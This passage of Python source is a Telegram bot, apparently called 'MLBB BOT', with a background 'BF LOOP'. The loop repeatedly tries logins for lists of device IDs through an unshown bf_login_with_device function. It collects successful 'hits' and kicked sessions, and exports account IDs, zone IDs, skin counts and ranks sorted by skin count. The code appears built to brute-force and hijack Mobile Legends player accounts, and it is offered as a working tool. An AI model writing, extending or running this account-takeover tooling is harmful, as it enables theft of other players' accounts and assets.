            f.write(f"│  Device ID  : {r.get('device_id','-')}\n")
            f.write(f"│  ID Akun    : {r.get('player_id','-')}\n")
            f.write(f"│  Zone ID    : {r.get('server','-')}\n")
            f.write(f"│  Skin Count : {r.get('skin_count', 0)}\n")
            f.write(f"│  Hero Count : {r.get('hero_count', 0)}\n")
            f.write(f"│  Level      : {r.get('level', 0)}\n")
            f.write(f"│  Rank       : {r.get('rank','-')}\n")
            f.write(f"│  High Rank  : {r.get('high_rank','-')}\n")
            f.write(f"│  Matches    : {r.get('matches', 0)}\n")
            f.write(f"└" + "─" * 70 + "\n\n")

    # ── JSON ──
    with open(fpath_json, "w", encoding="utf-8") as f:
        json.dump({
            "generated_at": datetime.datetime.now().isoformat(),
            "total_scan":   total,
            "hit":          len(succ),
            "banned":       banned,
            "fail":         fail,
            "sorted_by":    "skin_count_desc",
            "results": [
                {
                    "device_id":  r.get("device_id"),
                    "player_id":  r.get("player_id"),
                    "zone_id":    r.get("server"),
                    "nickname":   r.get("nickname"),
                    "skin_count": r.get("skin_count"),
                    "hero_count": r.get("hero_count"),
                    "level":      r.get("level"),
                    "rank":       r.get("rank"),
                    "high_rank":  r.get("high_rank"),
                    "matches":    r.get("matches"),
                } for r in succ
            ],
        }, f, indent=2, ensure_ascii=False)

    # ── Kirim hasil FULL ke Telegram ──
    caption = (
        f"⚡ *FAST BULK SELESAI*\n\n"
        f"📊 Scan     : `{total}`\n"
        f"✅ Hit      : `{len(succ)}`\n"
        f"🚫 Banned   : `{banned}` (dibuang)\n"
        f"❌ Fail     : `{fail}`\n"
        f"🏆 Top skin : `{succ[0]['skin_count'] if succ else 0}`\n\n"
        f"📁 File: TXT + JSON"
    )

    try:
        with open(fpath_txt, "rb") as f:
            await context.bot.send_document(
                chat_id=chat_id, document=f,
                filename=fname_txt,
                caption=caption, parse_mode="Markdown")
    except Exception as e:
        logger.warning(f"send txt err: {e}")

    try:
        with open(fpath_json, "rb") as f:
            await context.bot.send_document(
                chat_id=chat_id, document=f, filename=fname_json)
    except Exception as e:
        logger.warning(f"send json err: {e}")


# ══════════════════════════════════════════════════════════════════════
# 🔁 BF LOOP — BACKGROUND, NO ANIMATION, FULL DI AKHIR
# ══════════════════════════════════════════════════════════════════════
async def bf_input(update, context):
    uid = update.effective_user.id
    devs = extract_device_ids_from_text(update.message.text or "")

    if update.message.document:
        try:
            f = await update.message.document.get_file()
            b = await f.download_as_bytearray()
            devs += extract_device_ids_from_text(b.decode("utf-8", errors="ignore"))
        except Exception:
            pass

    devs = list(dict.fromkeys(devs))
    if not devs:
        await update.message.reply_text("❌ Tidak ada Device ID valid.",
                                        reply_markup=kb_main())
        return MENU

    # Stop task lama
    old = bf_tasks.get(uid)
    if old and not old["task"].done():
        bf_stop_flags[uid].set()
        old["task"].cancel()

    ev = threading.Event()
    bf_stop_flags[uid] = ev
    bf_pause[uid] = False

    msg = await update.message.reply_text(
        f"🔁 *BF LOOP — UNLIMITED*\n\n"
        f"📱 Device     : `{len(devs)}`\n"
        f"♾️ Loop       : *tanpa batas*\n"
        f"🔄 Status     : *Berjalan di background...*\n\n"
        f"Progress & hasil hanya muncul saat:\n"
        f"• Anda tekan ⏸️ PAUSE / 🛑 STOP\n"
        f"• Loop dihentikan\n\n"
        f"_Tidak ada spam pesan._",
        parse_mode="Markdown",
        reply_markup=kb_bf_running(paused=False))

    state = {
        "device_ids": devs,
        "hits": [],
        "kicked": [],
        "fails": 0,
        "loop": 0,
        "start": time.time(),
        "msg_id": msg.message_id,
        "chat_id": msg.chat_id,
        "device_index": 0,
        "total_device": len(devs),
        "total_scanned": 0,
        "last_ui_update": 0,
    }

    task = asyncio.create_task(_run_bf_loop(context, uid, state, ev))
    bf_tasks[uid] = {"task": task, "state": state}
    return BF_RUN


async def _run_bf_loop(context, uid, state, ev):
    """BF Loop UNLIMITED — jalan di background, kirim full di akhir."""
    cid = state["chat_id"]
    mid = state["msg_id"]

    async def render(force=False):
        """Update ringan di pesan yang sama. Hanya dipanggil sesekali."""
        now = time.time()
        if not force and (now - state["last_ui_update"]) < 10:  # update tiap 10 detik, bukan 1.5
            return
        state["last_ui_update"] = now

        elapsed = now - state["start"]
        paused = bf_pause.get(uid, False)
        status_icon = "⏸️ PAUSED" if paused else "🟢 RUNNING"

        rpm = int(state["total_scanned"] * 60 / elapsed) if elapsed > 0 else 0

        text = (
            f"🔁 *BF LOOP — UNLIMITED*  {status_icon}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔄 Loop     : *{state['loop']}*\n"
            f"📱 Device   : *{state['total_device']}*\n"
            f"⚡ RPM      : `{rpm}/min`\n"
            f"⏱ Runtime  : `{format_uptime(elapsed)}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ Hit      : *{len(state['hits'])}*\n"
            f"⚠️ Kicked   : *{len(state['kicked'])}*\n"
            f"❌ Fail     : *{state['fails']}*\n"
            f"📊 Scanned  : *{state['total_scanned']}*\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"_Background mode — pesan ini hanya update tiap 10s_"
        )

        try:
            await context.bot.edit_message_text(
                chat_id=cid, message_id=mid,
                text=text, parse_mode="Markdown",
                reply_markup=kb_bf_running(paused=paused))
        except telegram.error.BadRequest as e:
            if "not modified" not in str(e).lower():
                logger.warning(f"[BF edit] {e}")
        except telegram.error.RetryAfter as e:
            await asyncio.sleep(e.retry_after)
        except Exception as e:
            logger.warning(f"[BF edit] {e}")

    try:
        while not ev.is_set():
            # ⏸️ Pause
            while bf_pause.get(uid, False) and not ev.is_set():
                await asyncio.sleep(1)

            if ev.is_set():
                break

            state["loop"] += 1
            state["device_index"] = 0

            devs = state["device_ids"]
            with ThreadPoolExecutor(max_workers=BF_THREADS) as pool:
                futs = {pool.submit(bf_login_with_device, d): d for d in devs}
                for fut in as_completed(futs):
                    if ev.is_set():
                        break
                    d = futs[fut]
                    state["device_index"] += 1
                    state["total_scanned"] += 1

                    try:
                        r = fut.result(timeout=45)
                    except Exception as e:
                        r = {"status": "fail", "device_id": d, "error": str(e)}

                    if r.get("status") == "success":
                        info = r.get("info") or {}
                        if r.get("kick"):
                            state["kicked"].append((d, info))
                        else:
                            state["hits"].append((d, info))
                    else:
                        state["fails"] += 1

                    await render()

            await render(force=True)
            await asyncio.sleep(0.1)

    except asyncio.CancelledError:
        logger.info(f"[BF] Cancelled uid={uid}")
    except Exception:
        logger.exception("bf loop err")
    finally:
        bf_stop_flags.pop(uid, None)
        bf_tasks.pop(uid, None)

        # ── Kirim HASIL FULL ke Telegram (pesan baru, bukan edit) ──
        await _send_bf_full_result(context, cid, state, mid)


async def _send_bf_full_result(context, cid, state, mid):
    """Kirim hasil FULL BF loop: summary + list semua hit + list semua kick."""
    elapsed = time.time() - state["start"]
    hits   = state["hits"]
    kicks  = state["kicked"]

    # ── Header summary ──
    head = (
        f"🏁 *BF LOOP — SELESAI*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🔄 Total loop : `{state['loop']}`\n"
        f"✅ Hit        : `{len(hits)}`\n"
        f"⚠️ Kicked     : `{len(kicks)}`\n"
        f"❌ Fail       : `{state['fails']}`\n"
        f"📊 Scanned    : `{state['total_scanned']}`\n"
        f"⏱ Runtime    : `{format_uptime(elapsed)}`"
    )

    try:
        await context.bot.send_message(
            chat_id=cid, text=head, parse_mode="Markdown")
    except Exception as e:
        logger.warning(f"send head err: {e}")

    # ── List HIT (full) ──
    if hits:
        lines = [f"✅ *HIT* ({len(hits)} akun)\n"]
        for i, (d, info) in enumerate(hits, 1):
            acc  = info.get("account_id", "?")
            zone = info.get("zone_id", "?")
            lines.append(f"`{i:>3}.` acc `{acc}` | zone `{zone}`")
        # split kalau kepanjangan (>4000 char)
        await _send_long(context, cid, "\n".join(lines))

    # ── List KICKED (full) ──
    if kicks:
        lines = [f"⚠️ *KICKED — Aktif di perangkat lain* ({len(kicks)} akun)\n"]
        for i, (d, info) in enumerate(kicks, 1):
            acc  = info.get("account_id", "?")
            zone = info.get("zone_id", "?")
            lines.append(f"`{i:>3}.` acc `{acc}` | zone `{zone}`")
        await _send_long(context, cid, "\n".join(lines))

    # ── Update pesan lama jadi status akhir ──
    try:
        await context.bot.edit_message_text(
            chat_id=cid, message_id=mid,
            text=(f"🏁 *BF LOOP — STOPPED*\n\n"
                  f"Hasil lengkap dikirim di bawah ⬇️"),
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🗑️ HAPUS", callback_data="bf_delete")]
            ]))
    except Exception:
        pass


async def _send_long(context, chat_id, text, limit=4000):
    """Kirim teks panjang dengan split aman per baris."""
    if len(text) <= limit:
        try:
            await context.bot.send_message(chat_id=chat_id, text=text,
                                           parse_mode="Markdown")
        except Exception as e:
            logger.warning(f"send_long err: {e}")
        return

    lines = text.split("\n")
    buf = ""
    for ln in lines:
        if len(buf) + len(ln) + 1 > limit:
            try:
                await context.bot.send_message(chat_id=chat_id, text=buf,
                                               parse_mode="Markdown")
            except Exception as e:
                logger.warning(f"send_long chunk err: {e}")
            buf = ln + "\n"
        else:
            buf += ln + "\n"
    if buf.strip():
        try:
            await context.bot.send_message(chat_id=chat_id, text=buf,
                                           parse_mode="Markdown")
        except Exception as e:
            logger.warning(f"send_long tail err: {e}")


# ══════════════════════════════════════════════════════════════════════
# BF CONTROL
# ══════════════════════════════════════════════════════════════════════
async def bf_pause_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if uid not in bf_tasks:
        await q.answer("Tidak ada BF berjalan.", show_alert=True)
        return
    bf_pause[uid] = True
    # tampilkan status terkini ke user
    st = bf_tasks[uid]["state"]
    try:
        await context.bot.send_message(
            chat_id=q.message.chat_id,
            text=(f"⏸️ *BF DI-PAUSE*\n\n"
                  f"🔄 Loop     : `{st['loop']}`\n"
                  f"✅ Hit      : `{len(st['hits'])}`\n"
                  f"⚠️ Kicked   : `{len(st['kicked'])}`\n"
                  f"❌ Fail     : `{st['fails']}`\n"
                  f"📊 Scanned  : `{st['total_scanned']}`"),
            parse_mode="Markdown")
    except Exception:
        pass


async def bf_resume_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    if uid not in bf_tasks:
        await q.answer("Tidak ada BF berjalan.", show_alert=True)
        return
    bf_pause[uid] = False
    try:
        await q.message.edit_reply_markup(reply_markup=kb_bf_running(paused=False))
    except Exception:
        pass
    await q.answer("▶️ BF dilanjutkan")


async def bf_delete_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id

    ev = bf_stop_flags.get(uid)
    if ev: ev.set()
    task_data = bf_tasks.get(uid)
    if task_data and not task_data["task"].done():
        task_data["task"].cancel()
    bf_tasks.pop(uid, None)
    bf_pause.pop(uid, None)

    try:
        await context.bot.delete_message(
            chat_id=q.message.chat_id, message_id=q.message.message_id)
    except Exception:
        try:
            await q.message.delete()
        except Exception:
            pass

    await q.answer("🗑️ Proses BF dihapus")


# ══════════════════════════════════════════════════════════════════════
# POST INIT & MAIN
# ══════════════════════════════════════════════════════════════════════
async def post_init(app: Application):
    print("🔄 Delete webhook...")
    try:
        await app.bot.delete_webhook(drop_pending_updates=True)
        print("✅ Webhook cleared.")
    except Exception as e:
        print(f"⚠️ {e}")
    try:
        me = await app.bot.get_me()
        print(f"🤖 Bot: @{me.username} (id: {me.id})")
    except Exception as e:
        print(f"⚠️ {e}")


def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("❌ BOT_TOKEN tidak valid!")
        sys.exit(1)

    print("=" * 60)
    print("🤖 MLBB BOT — 2 FITUR (NO ANIMATION)")
    print("=" * 60)
    print(f"Token : {BOT_TOKEN[:15]}...{BOT_TOKEN[-5:]}")
    print(f"Owner : {OWNER_ID}")
    print(f"Fitur : FAST BULK | BF LOOP (background, no spam)")
    print("=" * 60)

    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    conv = ConversationHandler(
        entry_points=[
            CommandHandler("start", cmd_start),
            CallbackQueryHandler(menu_router),
        ],
        states={
            MENU: [CallbackQueryHandler(menu_router)],

            IN_BF: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, input_handler),
                MessageHandler(filters.Document.ALL, input_handler),
                CallbackQueryHandler(menu_router),
            ],
            BF_RUN: [
                CallbackQueryHandler(bf_pause_handler,  pattern="^bf_pause$"),
                CallbackQueryHandler(bf_resume_handler, pattern="^bf_resume$"),
                CallbackQueryHandler(bf_delete_handler, pattern="^bf_delete$"),
                CallbackQueryHandler(menu_router,
                                     pattern="^(stop_bf|m_close|m_home)$"),
            ],

            IN_BULK: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, input_handler),
                MessageHandler(filters.Document.ALL, input_handler),
                CallbackQueryHandler(menu_router),
            ],
            BULK_RUN: [
                CallbackQueryHandler(menu_router,
                                     pattern="^(stop_bulk|m_close|m_home)$"),
            ],
        },
        fallbacks=[
            CommandHandler("start", cmd_start),
            CommandHandler("cancel", cmd_cancel),
            CallbackQueryHandler(menu_router),
        ],
        allow_reentry=True,
    )

    app.add_handler(CommandHandler("id", cmd_id))
    app.add_handler(conv)

    print("✅ Bot running...")
    try:
        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
    except KeyboardInterrupt:
        print("\n👋 Stop.")
    except (Conflict, InvalidToken) as e:
        print(f"❌ FATAL: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
